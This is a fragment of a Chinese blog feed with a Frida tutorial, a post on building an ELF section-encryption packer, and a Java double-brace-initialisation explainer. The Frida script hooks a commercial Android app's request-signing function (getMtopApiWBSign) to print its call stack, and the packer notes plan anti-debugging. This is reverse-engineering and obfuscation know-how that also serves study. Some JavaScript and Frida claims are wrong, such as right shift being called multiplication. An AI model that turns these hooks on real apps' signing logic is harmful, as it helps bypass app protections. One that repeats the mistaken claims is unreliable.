<h2 id="打印-java-调用栈"><a href="#打印-java-调用栈" class="headerlink" title="打印 java 调用栈"></a>打印 java 调用栈</h2><p>通过 hook 目标函数，让其抛出 NullPointerException,  还要再开启一个终端，监控日志输出。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">"[*] Starting script"</span>);</div><div class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> Activity = Java.use(<span class="string">"c8.KSp"</span>);</div><div class="line">        <span class="keyword">var</span> nullclass = Java.use(<span class="string">"java.lang.NullPointerException"</span>);</div><div class="line">        Activity.getMtopApiWBSign.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="comment">// console.log("c8.CPc.d() !!!");</span></div><div class="line">            <span class="keyword">var</span> sign = <span class="keyword">this</span>.getMtopApiWBSign(<span class="built_in">arguments</span>[<span class="number">0</span>], <span class="built_in">arguments</span>[<span class="number">1</span>], <span class="built_in">arguments</span>[<span class="number">2</span>]);</div><div class="line">            <span class="keyword">var</span>  nullinstall = nullclass.$<span class="keyword">new</span>()</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">'Printing ...'</span>)</div><div class="line">            <span class="keyword">throw</span> nullinstall</div><div class="line"></div><div class="line">            <span class="keyword">return</span> sign</div><div class="line">        &#125;;</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>这里通过反射创建了 <code>java.lang.NullPointerException</code> 对象。</p>
<p>Terminal 2:<br><code>adb logcat | grep --color=auto $pid</code></p>
<p><img src="/include/img/hook/nullpointstack.png" alt="nullpointstack"></p>
<h1 id="mac-上尝试"><a href="#mac-上尝试" class="headerlink" title="mac 上尝试"></a>mac 上尝试</h1><blockquote>
<p>在 MacOS 使用 Firda 需要关闭 SIP</p>
</blockquote>
<p>没有关闭的化 无法 attach 目标进程。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> frida /Applications/Calculator.app/Contents/MacOS/Calculator -l app.js --debug</div><div class="line"></div><div class="line">     ____</div><div class="line">    / _  |   Frida 9.1.27 - A world-class dynamic instrumentation framework</div><div class="line">   | (_| |</div><div class="line">    &gt; _  |   Commands:</div><div class="line">   /_/ |_|       help      -&gt; Displays the help system</div><div class="line">   . . . .       object?   -&gt; Display information about &apos;object&apos;</div><div class="line">   . . . .       exit/quit -&gt; Exit</div><div class="line">   . . . .</div><div class="line">   . . . .   More info at http://www.frida.re/docs/home/</div><div class="line">Failed to attach: unable to access process with pid 7480 from the current user account</div></pre></td></tr></table></figure></p>
<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p><span id="bug1"></span></p>
<ol>
<li><code>Error: Not allowed outside Java.perform() callback</code><br><img src="/include/img/hook/bug1.png" alt="Java.use 放错了位置"></li>
</ol>
<p>通过测试发现 Java.use、Java.cast 这2个方法不能放在 Java.perform 中使用，否则就会有这个 bug。</p>
<h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><p>介绍 javascript 之前没接触过这门语言，看 Frida 之前学习了一下语法。<br>在知乎上搜索了一些资料，最后选择了2个学习的网站：</p>
<ul>
<li><a href="http://weizhifeng.net/javascript-the-core.html" target="_blank" rel="external">JavaScript核心</a></li>
<li><a href="http://wiki.jikexueyuan.com/project/javascript/operators.html" target="_blank" rel="external">极客学院 JavaScript 开发</a></li>
</ul>
<h3 id="JavaScript语法"><a href="#JavaScript语法" class="headerlink" title="JavaScript语法"></a>JavaScript语法</h3><h4 id="1-对象"><a href="#1-对象" class="headerlink" title="1.对象"></a>1.对象</h4><ul>
<li>原型对象</li>
</ul>
<p><code>一个对象就是一个属性集合，并拥有一个独立的prototype（原型）对象。这个prototype可以是一个对象或者null。</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var foo = &#123;</div><div class="line">  x: 10,</div><div class="line">  y: 20</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我们拥有一个这样的结构，两个明显的自身属性和一个隐含的<strong>proto</strong>属性，这个属性是对foo原型对象的引用</p>
<h4 id="2-变量"><a href="#2-变量" class="headerlink" title="2.变量"></a>2.变量</h4><p>有如下三类基础数据类型：</p>
<ul>
<li>数值类型：比如 123,120.50 等。</li>
<li>字符串类型：比如“This text string”。</li>
<li><p>布尔类型：比如 true or false。</p>
</li>
<li><p>另外两个常用类型：null 和 undefined，这两个类型均仅限定一个单一的值。</p>
</li>
</ul>
<p>还支持上面介绍的 对象类型.<br><strong>注意</strong>：JAVA语言并区分整数类型与浮点类型。JavaScript 中的数值均使用浮点值来表示。同时，按照 IEEE754 标准，JavaScript 用64位浮点格式来表示数。</p>
<p>在 JavaScript 编程过程中，必须先声明一个变量，这个变量才能被使用。<br>此外，变量是通过 “var” 来声明的，例子如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    <span class="xml"><span class="comment">&lt;!--</span></span></div><div class="line">    var money, type;</div><div class="line">    var name;</div><div class="line">    name = "Ali";</div><div class="line">    //--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>JavaScript 是一种无类型语言。这就是说， JavaScript 变量可以存储任何类型的值。与其他语言不同的是，我们不需要在变量声明阶段告诉变量其要存储的数据类型是什么。</p>
<p><strong>JavaScript变量作用域</strong></p>
<ul>
<li>全局变量：全局变量具有全部整体范围的作用域，这意味着它可以在 JavaScript 代码任何地方定义。</li>
<li>局部变量：局部变量仅在定义它的函数体内可以访问到。函数参数对于函数来说就是局部变量。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    <span class="xml"><span class="comment">&lt;!--</span></span></div><div class="line">    var myVar = "global"; // Declare a global variable</div><div class="line">    function checkscope( ) &#123;</div><div class="line">       var myVar = "local";  // Declare a local variable</div><div class="line">       document.write(myVar);</div><div class="line">    &#125;</div><div class="line">    //--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">// 输出：</span></div><div class="line"><span class="comment">//      Local</span></div></pre></td></tr></table></figure>
<p><strong>JavaScript 保留的关键字</strong></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>abstract</td>
<td>else</td>
<td>instanceof</td>
<td>switch</td>
</tr>
<tr>
<td>boolean</td>
<td>enum</td>
<td>int</td>
<td>synchronized</td>
</tr>
<tr>
<td>break</td>
<td>export</td>
<td>interface</td>
<td>this</td>
</tr>
<tr>
<td>byte</td>
<td>extends</td>
<td>long</td>
<td>throw</td>
</tr>
<tr>
<td>case</td>
<td>FALSE</td>
<td>native</td>
<td>throws</td>
</tr>
<tr>
<td>catch</td>
<td>final</td>
<td>new</td>
<td>transient</td>
</tr>
<tr>
<td>char</td>
<td>finally</td>
<td>null</td>
<td>TRUE</td>
</tr>
<tr>
<td>class</td>
<td>float</td>
<td>package</td>
<td>try</td>
</tr>
<tr>
<td>const</td>
<td>for</td>
<td>private</td>
<td>typeof</td>
</tr>
<tr>
<td>continue</td>
<td>function</td>
<td>protected</td>
<td>var</td>
</tr>
<tr>
<td>debugger</td>
<td>goto</td>
<td>public</td>
<td>void</td>
</tr>
<tr>
<td>default</td>
<td>if</td>
<td>return</td>
<td>volatile</td>
</tr>
<tr>
<td>delete</td>
<td>implements</td>
<td>short</td>
<td>while</td>
</tr>
<tr>
<td>do</td>
<td>import</td>
<td>static</td>
<td>with</td>
</tr>
<tr>
<td>double</td>
<td>in</td>
<td>super</td>
</tr>
</tbody>
</table>
<h4 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3.运算符"></a>3.运算符</h4><ul>
<li><p>&lt;&lt;  称为按位左移运算符。它把第一个运算数的所有二进制位向左移动第二个运算数指定的位数，而新的二进制位补0。将一个数向左移动一个二进制位相当于将该数乘以2，向左移动两个二进制位相当于将该数乘以4，以此类推。    A &lt;&lt; 1 = 4.</p>
</li>
<li><p>‘&gt;&gt;’  称为按位右移运算符。它把第一个运算数的所有二进制位向右移动第二个运算数指定的位数。为了保持运算结果的符号不变，左边二进制位补0或1取决于原参数的符号位。如果第一个运算数是正的，运算结果最高位补0；如果第一个运算数是负的，运算结果最高位补1。将一个数向右移动一位相当于将该数乘以2，向右移动两位相当于将该数乘以4，以此类推。   A &gt;&gt; 1 = 1.</p>
</li>
<li><p>‘&gt;&gt;&gt;’ 称为0补最高位无符号右移运算符。这个运算符与&gt;&gt;运算符相像，除了位移后左边总是补0.  A &gt;&gt;&gt; = 1.</p>
</li>
</ul>
<h4 id="4-函数"><a href="#4-函数" class="headerlink" title="4.函数"></a>4.函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">* 定义函数：</div><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    <span class="xml"><span class="comment">&lt;!--</span></span></div><div class="line">    function functionname(parameter-list)</div><div class="line">    &#123;</div><div class="line">        statements</div><div class="line">    &#125;</div><div class="line">    //--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></div></pre></td></tr></table></figure>
<blockquote>
<p>知识的搬运工今天都当到这里，剩下的就是 Coding</p>
</blockquote>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p><a href="http://zhiwei.li/text/2016/03/22/frida-hook%E9%87%8D%E8%BD%BD%E5%87%BD%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95/" target="_blank" rel="external">overload 用法</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Frida 支持的系统包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Android(root/非 root),&lt;/li&gt;
&lt;li&gt;iOS(越狱/非越狱),&lt;/li&gt;
&lt;li&gt;MacOS(关闭 SIP),&lt;/li&gt;
&lt;li&gt;Linux, Windows等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Frida wiki 的这张表&lt;a href=&quot;https://github.com/frida/frida/wiki/Comparison-of-function-hooking-libraries&quot;&gt;Hook工具兼容性对比&lt;/a&gt; 充分说明了frida的强大。&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="hook" scheme="http://yoursite.com/tags/hook/"/>
    
      <category term="frida" scheme="http://yoursite.com/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>Android ELF 文件加壳</title>
    <link href="http://yoursite.com/2017/03/28/Android-ELF-%E6%96%87%E4%BB%B6%E5%8A%A0%E5%A3%B3/"/>
    <id>http://yoursite.com/2017/03/28/Android-ELF-文件加壳/</id>
    <published>2017-03-28T14:38:01.000Z</published>
    <updated>2017-03-28T15:13:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>测试，给 ELF 可执行文件的 特定section 加密。。。<br><a id="more"></a></p>
<p>目前需要对 某个工具做加密处理，但是没有发现公开的可以对 elf 可执行文件加壳的本地工具。于是参照网上 的文章修改了一个自己的加固工具，非常的菜-入门级的。</p>
<p>参考文章：<br><a href="http://burningcodes.net/so%E5%8A%A0%E5%9B%BA%E7%B3%BB%E5%88%97%E4%B9%8B%E7%90%86%E8%A7%A3elf%E6%A0%BC%E5%BC%8F/" target="_blank" rel="external">SO加固系列之理解ELF格式</a><br><a href="http://burningcodes.net/so%E5%8A%A0%E5%9B%BA%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A0%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8F%8Apython%E5%AE%9E%E7%8E%B0/" target="_blank" rel="external">SO加固系列之加壳原理及Python实现</a><br><a href="http://burningcodes.net/so%E5%8A%A0%E5%9B%BA%E7%B3%BB%E5%88%97%E4%B9%8B%E8%BF%90%E8%A1%8C%E6%97%B6%E8%A7%A3%E5%AF%86/" target="_blank" rel="external">SO加固系列之运行时解密</a></p>
<h3 id="第一版-ELF-可执行文件加密"><a href="#第一版-ELF-可执行文件加密" class="headerlink" title="第一版 ELF 可执行文件加密"></a>第一版 ELF 可执行文件加密</h3><h4 id="修改的地方"><a href="#修改的地方" class="headerlink" title="修改的地方"></a>修改的地方</h4><p>不能再用 head 中的 e_entry 和 e_shoff 保存加密段的长度和偏移信息了。因为 可执行文件的加载时会跳到这个入口地址去执行。</p>
<p>尝试了 head 中的几个字段发现都不能被修改。于是最快的办法就是 手动测试 偏移地址和 size ，然后在解密代码中 硬编码 偏移量和 size（这个方法很愚蠢）。</p>
<p>具体对 文章代码做的修改:<br>1.手动 修改 源码，中 【1】mAddr, 【2】size, 【3】name /<em> maps 中的 app name</em>/<br><strong>修改 mAddr 和 size 是需要借助010 工具</strong>，对比 patch 前后的二进制文件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">exp</span>.c 文件。</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> name[] = <span class="string">"被加壳 app 的名字"</span>;    <span class="comment">//patch1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">new_init</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//printf("[+] decrypt\n");</span></div><div class="line">    <span class="comment">// getchar();</span></div><div class="line"></div><div class="line">    Elf32_Ehdr *elfhdr;</div><div class="line">    Elf32_Shdr *shdr;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size, base, offset;</div><div class="line">    <span class="keyword">int</span> n, i;</div><div class="line"></div><div class="line">    <span class="comment">//从maps中读取elf文件在内存中的起始地址</span></div><div class="line">    base = GetLibAddr();</div><div class="line">    <span class="comment">//printf("%x\n", base);</span></div><div class="line">    elfhdr = (Elf32_Ehdr *) base;</div><div class="line">    <span class="comment">//获取要被解密的section的内存地址</span></div><div class="line">    offset = elfhdr-&gt;e_shoff + base;</div><div class="line">    <span class="comment">// lk patch</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> mAddr = <span class="number">0x23b4</span>;            <span class="comment">//patch2</span></div><div class="line">    offset = mAddr + base;</div><div class="line">    <span class="comment">//section大小</span></div><div class="line">    size = elfhdr-&gt;e_entry;</div><div class="line">    <span class="comment">// lk patch</span></div><div class="line">    size = <span class="number">0x3d4</span>;               <span class="comment">//patch3</span></div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>每次修改代码都要重修  上面的几个地方</strong></p>
<ol>
<li>手动 修改 加固脚本 中 【1】文件名,  【2】自定义段名<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">so-encrypt.py 文件</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    df = SO(<span class="string">"libs/armeabi-v7a/xxx"</span>)        <span class="comment">#patch1</span></div><div class="line">    df.EncrySection(<span class="string">"strings"</span>)          <span class="comment">#patch2</span></div><div class="line">    df.Close()</div></pre></td></tr></table></figure>
</li>
</ol>
<p>###Todo List</p>
<table>
<thead>
<tr>
<th>内容</th>
<th>完成情况</th>
</tr>
</thead>
<tbody>
<tr>
<td>1. 优化代码，提高自动化</td>
<td></td>
</tr>
<tr>
<td>2. 添加反调试代码</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;测试，给 ELF 可执行文件的 特定section 加密。。。&lt;br&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
  </entry>
  
  <entry>
    <title>java ArrayList&lt;String&gt;(){{add();}}; 用法说明</title>
    <link href="http://yoursite.com/2017/03/20/%E5%BC%80%E5%8F%91/java-ArrayList-String-add-%E7%94%A8%E6%B3%95%E8%AF%B4%E6%98%8E/"/>
    <id>http://yoursite.com/2017/03/20/开发/java-ArrayList-String-add-用法说明/</id>
    <published>2017-03-20T06:03:15.000Z</published>
    <updated>2017-04-28T02:48:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载自：<a href="https://my.oschina.net/nullObject/blog/181802?p=1" target="_blank" rel="external">https://my.oschina.net/nullObject/blog/181802?p=1</a></p>
<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">new ArrayList&lt;String&gt;()&#123;&#123;</div><div class="line">    add(&quot;&quot;);</div><div class="line">&#125;&#125;;</div></pre></td></tr></table></figure>
<p>java 代码中出现这种写法，好奇add 函数是调用哪里的？<br><a id="more"></a></p>
<h3 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Anonymous</span> </span>&#123;</div><div class="line">    <span class="comment">// 代码块 1</span></div><div class="line">    &#123;</div><div class="line">        System.out.println(<span class="string">"代码块:"</span>+<span class="keyword">this</span>.getClass().getName());       <span class="comment">// 1】AnonymousDemo$1   //11】 aaa$1   //Anonymous</span></div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Anonymous</span><span class="params">()</span> </span>&#123;</div><div class="line">        System.out.println(<span class="string">"无参构造函数:"</span>+<span class="keyword">this</span>.getClass().getName());    <span class="comment">// 2】AnonymousDemo$1   // 12】aaa$1  //Anonymous</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">aaa</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">aaa</span><span class="params">()</span> </span>&#123;</div><div class="line">        Anonymous n = <span class="keyword">new</span> Anonymous()&#123;</div><div class="line">            <span class="comment">// 代码块 4</span></div><div class="line">            &#123;</div><div class="line">                System.out.println(<span class="string">"Anonymous匿名类:"</span>+<span class="keyword">this</span>.getClass().getName());      <span class="comment">// 13】 aaa$1</span></div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        System.out.println(<span class="string">"n:"</span>+n.getClass().getName());        <span class="comment">//14】 aaa$1</span></div><div class="line">        List&lt;String&gt; list_1 = <span class="keyword">new</span> ArrayList&lt;String&gt;()&#123;</div><div class="line">            &#123;</div><div class="line">                System.out.println(<span class="string">"List匿名类:"</span>+<span class="keyword">this</span>.getClass().getName());       <span class="comment">//  15】aaa$2</span></div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        System.out.println(<span class="string">"list_1:"</span>+list_1.getClass().getName());      <span class="comment">// 16】 aaa$2</span></div><div class="line">        List&lt;String&gt; list_2 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">        System.out.println(<span class="string">"list_2:"</span>+list_2.getClass().getName());      <span class="comment">//  17】 java.util.ArrayList</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">bbb</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">bbb</span><span class="params">()</span> </span>&#123;</div><div class="line">        Anonymous n = <span class="keyword">new</span> Anonymous();</div><div class="line"></div><div class="line">        System.out.println(<span class="string">"n:"</span>+n.getClass().getName());        <span class="comment">// Anonymous</span></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnonymousDemo</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//@Test</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;</div><div class="line">        Anonymous n = <span class="keyword">new</span> Anonymous()&#123;</div><div class="line">            <span class="comment">// 代码块 2</span></div><div class="line">            &#123;</div><div class="line">                System.out.println(<span class="string">"Anonymous匿名类:"</span>+<span class="keyword">this</span>.getClass().getName());      <span class="comment">// 3】AnonymousDemo$1</span></div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        System.out.println(<span class="string">"n:"</span>+n.getClass().getName());        <span class="comment">//  4】AnonymousDemo$1</span></div><div class="line">        List&lt;String&gt; list_1 = <span class="keyword">new</span> ArrayList&lt;String&gt;()&#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</div><div class="line">                System.out.println(<span class="string">"size"</span>);     <span class="comment">// 7】</span></div><div class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.size();            <span class="comment">//  8】</span></div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="comment">// 代码块3</span></div><div class="line">            &#123;</div><div class="line">                System.out.println(<span class="string">"List匿名类:"</span>+<span class="keyword">this</span>.getClass().getName());   <span class="comment">// 5】AnonymousDemo$2</span></div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        System.out.println(<span class="string">"list_1:"</span>+list_1.getClass().getName());      <span class="comment">// 6】AnonymousDemo$2</span></div><div class="line">        System.out.println(list_1.size());</div><div class="line"></div><div class="line">        List&lt;String&gt; list_2 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">        System.out.println(<span class="string">"list_2:"</span>+list_2.getClass().getName());      <span class="comment">// 9】java.util.ArrayList</span></div><div class="line">    &#125;</div><div class="line">    <span class="comment">//@Test</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</div><div class="line">        System.out.println(<span class="string">"--------------------"</span>);     <span class="comment">//10 】</span></div><div class="line">        aaa a = <span class="keyword">new</span> aaa();</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// @Test</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</div><div class="line">        System.out.println(<span class="string">"--------------------"</span>);</div><div class="line">        bbb b = <span class="keyword">new</span> bbb();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        test1();</div><div class="line">        test2();</div><div class="line">        test3();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="/include/img/AnonymousDemo.png" alt="AnonymousDemo输出"></p>
<h4 id="代码块用法总结："><a href="#代码块用法总结：" class="headerlink" title="代码块用法总结："></a>代码块用法总结：</h4><p><strong>代码块写在那个类,就是那个类的匿名类;相当于匿名类继承原有类,并且覆盖方法。</strong></p>
<h4 id="执行数序："><a href="#执行数序：" class="headerlink" title="执行数序："></a>执行数序：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">父类的- 静态代码块 static &#123;&#125;</div><div class="line">    |- 普通代码块 &#123;&#125;</div><div class="line">        |- 构造函数</div><div class="line"></div><div class="line">子类(匿名类)- 静态代码块 static &#123;&#125;</div><div class="line">    |- 普通代码块 &#123;&#125;</div><div class="line">        |- 构造函数</div><div class="line"></div><div class="line">注意：一个 class 的静态代码块在 JVM 中只会调用一次。</div></pre></td></tr></table></figure>
<p>根据 代码中注释 1】,2】… 可以证明上面的调用顺序是正确的。</p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><strong>代码块写在那个类,就是那个类的匿名类;相当于匿名类继承原有类,并且覆盖方法。</strong></p>
<p>分析下 4个代码块的写法</p>
<p>代码块1：给自定义 class Anonymous 添加代码块，会在构造函数之前被执行，并且每次创建Anonymous 对象都会执行。</p>
<p>代码块2：创建自定义 class Anonymous 对象时添加代码块，那就相当于 <strong>创建一个Anonymous class的匿名子类</strong>。所以在 匿名类、父类、以及所有的方法中显示的 ClassName 都是当前创建匿名类(AnonymousDemo)的子类(AnonymousDemo.$1); 可以结合 test3()对比。</p>
<p>代码块3：创建 <strong>系统 class ArrayList 对象时添加代码块，和代码块2的原理是一样的</strong>。这里也不会显示ArrayList的名字而是显示AnonymousDemo.$2;</p>
<p>代码块4： 和代码块2 完全一样</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转载自：&lt;a href=&quot;https://my.oschina.net/nullObject/blog/181802?p=1&quot;&gt;https://my.oschina.net/nullObject/blog/181802?p=1&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
